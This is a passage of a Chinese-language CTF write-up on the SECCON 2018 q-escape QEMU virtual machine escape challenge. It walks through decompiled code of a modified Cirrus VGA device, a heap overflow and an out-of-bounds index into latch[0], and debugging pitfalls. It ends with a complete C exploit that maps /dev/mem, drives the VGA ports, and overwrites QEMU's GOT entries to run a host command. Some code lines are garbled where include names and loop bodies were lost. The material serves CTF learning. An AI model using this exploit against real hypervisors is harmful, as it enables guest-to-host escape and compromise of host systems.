          {//v7==3
          //v8->vs[0].max_size=mem_value
            v23 = (opaque + 16 * BYTE2(mem_value));
            if ( v23->vs[0].buf )
            {
              if ( mem_value vs[0].max_size = mem_value;
            }
          }
        }
v7由opaque->vga.sr[204]来确定，那么opaque->vga.sr[204]是从哪里来的呢？我们发现可以通过cydf_vga_ioport_write函数来控制opaque->vga.sr[]数组的值
    //cydf_vga_ioport_write
          case 0x3C4uLL:
            opaque->vga.sr_index = v4;
            break;
          case 0x3C5uLL:
            v10 = opaque->vga.sr_index;
            switch ( v10 )
            {
              case 8:
              case 9:
              case 0xA:
              case 0xB:
              case 0xC:
              case 0xD:
              case 0xE:
              case 0xF:
              case 0x13:
              case 0x14:
              case 0x15:
              case 0x16:
              case 0x18:
              case 0x19:
              case 0x1A:
              case 0x1B:
              case 0x1C:
              case 0x1D:
              case 0x1E:
              case 0x1F:
              case 0xCC:
              case 0xCD:
              case 0xCE:
    LABEL_28:
                opaque->vga.sr[v10] = v4;
                break;
因此可以通过设置opaque->vga.sr_index索引的值为0xCC来控制v7的值，同样，我们也能控制opaque->vga.sr[0xCD/0XCE]的值  
总共有5种功能
  1. 1、v7==0时，opaque->vs[vulncnt].buf=malloc(mem_value&0xfff)，max_size==mem_value&0xfff
  2. 2、v7==1时，当cur_sizevs[idx].buf[cur_sizee++]=mem_value&0xff。
  3. 3、v7==2时，printf_chk(1,opaque->vs[idx].buf)
  4. 4、v7==3时，opaque->vs[idx].max_size=mem_value&0xfff
  5. 5、v7==4时，opaque->vs[idx].buf[cur_sizee++]=mem_value&0xff
可以发现漏洞点
  1. v7==4时，没有对cur_size进行检查，可以形成堆溢出
  2. 从CydfVGAState_0结构体 
        //CydfVGAState_0
    000133D8 vs              VulnState_0 16 dup(?)
    000134D8 latch           dd 4 dup(?)
可以看到vs数组只有16个元素，而程序中对idx的判断允许idx==16，因此形成数组溢出到latch[0]。然后在cydf_vga_mem_read函数能控制latch[0]
        v3 = opaque->latch[0];
    if ( !(_WORD)v3 )
    {
     opaque->latch[0] = addr | v3;
     return vga_mem_readb(&opaque->vga, addr);
    }
    opaque->latch[0] = (_DWORD)addr ，函数的具体用法可以使用man手册查看。
还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于0x000-0x3ff之间的端口，使用ioperm(from, num,
turn_on)即可；对于0x3ff以上的端口，则该调用执行iopl(3)函数去允许访问所有的端口（可使用man ioperm 和man
iopl去查看函数）。
这题vga+的端口为03c0-03df，因此只需要靶机具有root权限，并调用`ioperm(0x3b0, 0x30, 1)`打开端口。  
在调用cydf_vga_ioport_write函数时使用outl和outw指令不能将val参数传进去，而用outb指令就能成功，这个问题没搞清楚。
####  访问vga_mem
vga_mem的内存空间并没有在resource文件中体现，根据源码中对cirrus_vga_mem_read函数有个描述，vga的内存空间在0xa0000-0xbffff中，与`cat
/proc/iomem`的结果一致。
    /***************************************
     *
     *  memory access between 0xa0000-0xbffff
     *
     ***************************************/
    static uint64_t cirrus_vga_mem_read(void *opaque,
                                        hwaddr addr,
                                        uint32_t size)
有一个访问物理内存的简单方法时映射`/dev/mem`到我们的进程中，然后我们就可以像正常访存一样进行读写。但是提供的环境中并没有挂载/dev/mem文件，我们可以通过`mknod
-m 660 /dev/mem c 1 1`命令挂载上去。
    system( "mknod -m 660 /dev/mem c 1 1" );
    int fd = open( "/dev/mem", O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        return 0;
    }
    mmio_mem = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xfebc1000 );
    if ( !mmio_mem ) {
        die("mmap mmio failed");
    }
    vga_mem = mmap( NULL, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xa0000 );
    if ( !vga_mem ) {
        die("mmap vga mem failed");
    }
####  程序没有在断点处断下
  1. 1、在访问vga_mem内存调用cydf_vga_mem_read函数时，在调试器中并没有观察到程序流在此处断下。（这里卡了我很久）  
可能的原因：在编译exp.c的过程中，如果访问了vga_mem没有对返回值进行处理，也就是这个操作对程序执行结果没有影响，编译器可能会将其进行优化，优化的结果会将这段代码删去，这样一来就不能触发断点。这可能也是很多现有的exp不能跑通的原因。  
解决方法：将返回值结果输出
  2. 2、同样的问题在调用vga_mem_write函数的时候出现，解决方法相同，也即将要写入的数据输出。
  3. 3、在调用vga_mem_write函数进行任意地址写时，并实际写入的数据并不是我们传入的参数。  
解决方法：同样还是将写入的数据输出。另外在写入”cat
/flag”字符串的时候，使用printf(“%s”)还是不能解决问题，而是通过将每个字符输出才能成功。
###  exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include
    uint32_t mmio_addr = 0xfebc1000;
    uint32_t mmio_size = 0x1000;
    uint32_t vga_addr = 0xa0000;
    uint32_t vga_size = 0x20000;
    unsigned char* mmio_mem;
    unsigned char* vga_mem;
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    void set_sr(unsigned int idx, unsigned int val){
        outb(idx,0x3c4);
        outb(val,0x3c5);
    }
    void vga_mem_write(uint32_t addr, uint8_t value)
    {
        *( (uint8_t *) (vga_mem+addr) ) = value;
    }
    void set_latch( uint32_t value){
        char a;
        a = vga_mem[(value>>16)&0xffff];
        write(1,&a,1);
        a = vga_mem[value&0xffff];
        write(1,&a,1);
    }
    int main(int argc, char *argv[])
    {
        //step 1 mmap /dev/mem to system, (man mem) to see the detail
        system( "mknod -m 660 /dev/mem c 1 1" );
        int fd = open( "/dev/mem", O_RDWR | O_SYNC );
        if ( fd == -1 ) {
            return 0;
        }
        //step2 map the address to fd
        mmio_mem = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmio_addr );
        if ( !mmio_mem ) {
            die("mmap mmio failed");
        }
        vga_mem = mmap( NULL, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr );
        if ( !vga_mem ) {
            die("mmap vga mem failed");
        }
        if (ioperm(0x3b0, 0x30, 1) == -1) {
            die("cannot ioperm");   
        }
        set_sr(7,1);
        set_sr(0xcc,4);     //v7==4
        set_sr(0xcd,0x10);  //vs[0x10]
        // write cat /flag to bss
        char a;
        unsigned int index = 0;
        uint64_t bss = 0x10C9850;
        char* payload = "cat /flag";
        a=vga_mem[1];write(1,&a,1); //init latch
        set_latch(bss);     //set latch[0]
        for (int i=0; i bss
        uint32_t qemu_logfile = 0x10CCBE0;
        set_latch(qemu_logfile-index);
        payload = (char*)&bss;
        printf("%s\n",payload);
        for (int i=0; i system.plt
        uint32_t vfprintf_got=0xEE7BB0;
        uint64_t system_plt=0x409DD0;
        set_latch(vfprintf_got-index);
        payload = (char*)&system_plt;
        printf("%s\n",payload);
        for (int i=0; i qemu_log
        uint64_t qemu_log = 0x9726E8;
        uint32_t printf_chk_got=0xEE7028;
        set_latch(printf_chk_got-index);
        payload = (char*)&qemu_log;
        printf("%s\n",payload);
        for (int i=0; i<8; i++) {
            vga_mem_write(0x18100,payload[i]);
        }
        set_sr(0xcc,2);
        vga_mem_write(0x18100,1);//printf_chk
        return 0;
    }
## 总结
第一题的漏洞在MMIO空间，而第二题的漏洞需要MMIO空间操作搭配PMIO空间操作。从出题角度看第一题属于出题者添加一个含有漏洞的设备，代码量和难度相对比较小；而第二题属于从qemu源码中修改形成的漏洞设备，代码量相对要大，难度较高。
本文断断续续花了笔者一周的时间，调试这两题遇到了很多问题，其中还有一些问题没有深究其原因，望各位指正！
## Reference
[qemu-pwn-seccon-2018-q-escape](https://ray-cp.github.io/archivers/qemu-pwn-seccon-2018-q-escape#%E6%8F%8F%E8%BF%B0)  
[BlizzardCTF-2017-Strng](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)  
[q-escape – SECCON 2018](https://devcraft.io/2018/11/22/q-escape-seccon-2018.html)  
[cirrus_vga.c](https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004)  
[vgamem](http://www.osdever.net/FreeVGA/vga/vgamem.htm)
题目文件：
[HITB GSEC2017_babyqemu](https://github.com/Snowleopard-bin/pwn/blob/master/qemu_escape/HITB_GSEC2017_babyqemu/HITB%20GSEC2017_babyqemu.tar.gz)  
[seccon_2018_q-escape](https://github.com/Snowleopard-bin/pwn/blob/master/qemu_escape/seccon_2018_q-escape/seccon_2018_q-escape.tar.gz)